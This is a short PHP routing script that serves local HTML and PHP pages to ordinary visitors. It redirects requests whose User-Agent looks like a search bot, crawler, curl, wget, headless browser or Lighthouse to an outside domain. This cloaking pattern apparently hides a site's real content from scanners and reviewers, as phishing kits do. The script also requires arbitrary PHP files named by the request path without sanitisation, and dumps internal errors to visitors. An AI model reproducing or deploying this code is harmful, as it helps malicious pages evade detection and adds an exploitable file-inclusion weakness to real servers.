<?php
register_shutdown_function(function () {
    $error = error_get_last();
    if ($error !== null) {
        http_response_code(200);
        echo "<pre style='color:red; font-size:16px;'>";
        print_r($error);
        echo "</pre>";
    }
});

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isFilter = preg_match('/bot|crawl|slurp|spider|google|bing|facebook|curl|wget|headless|lighthouse/i', $userAgent);

if ($isFilter) {
    header("Location: https://redbamsold.com", true, 302);
    exit;
}

$baseDir = __DIR__;
$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$defaultPage = $baseDir . '/index.html';

if ($uri === '/' || $uri === '') {
    if (file_exists($defaultPage)) {
        readfile($defaultPage);
    } else {
        echo "Default page not found.";
    }
    exit;
}

$file = $baseDir . $uri;

if (file_exists($file) && !is_dir($file)) {
    $ext = pathinfo($file, PATHINFO_EXTENSION);
    if ($ext === 'php') {
        chdir(dirname($file));
        require $file;
        exit;
    } elseif ($ext === 'html') {
        readfile($file);
        exit;
    }
    return false;
}

if (file_exists($defaultPage)) {
    readfile($defaultPage);
}
exit;
